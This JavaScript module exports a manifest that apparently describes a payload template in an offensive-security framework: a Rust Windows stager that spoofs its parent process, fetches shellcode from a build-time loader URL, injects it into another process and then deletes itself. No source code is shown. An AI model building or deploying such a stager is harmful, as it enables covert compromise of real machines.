const manifest = {
  "title": "Rust PE Stager \u2014 PPID Spoof + Process Injection",
  "file_type": "exe",
  "payload_type": "Rust",
  "author": "ph3eds",
  "description": "Compiled PE stager. Spoofs parent PID to explorer.exe, fetches donut shellcode from Thorn or extracts from ZIP embed, injects into a sacrificial process via VirtualAllocEx/WriteProcessMemory/CreateRemoteThread. Self-deletes on completion.",
  "mitre": [
    "T1055.002",
    "T1134.004",
    "T1036.005"
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1055/002/",
    "https://attack.mitre.org/techniques/T1134/004/"
  ],
  "parameters": [
    {
      "name": "loader_url",
      "placeholder": "{{LOADER_URL}}",
      "type": "",
      "description": "URL to fetch the donut shellcode (beacon.bin) from. Patched at build time.",
      "default": ""
    }
  ],
  "cargo_deps": {
    "aes": "0.8",
    "cbc": "0.1",
    "windows": {
      "version": "0.58",
      "features": [
        "Win32_Foundation",
        "Win32_System_Threading",
        "Win32_System_Diagnostics_ToolHelp",
        "Win32_System_LibraryLoader"
      ]
    }
  }
}
export { manifest }
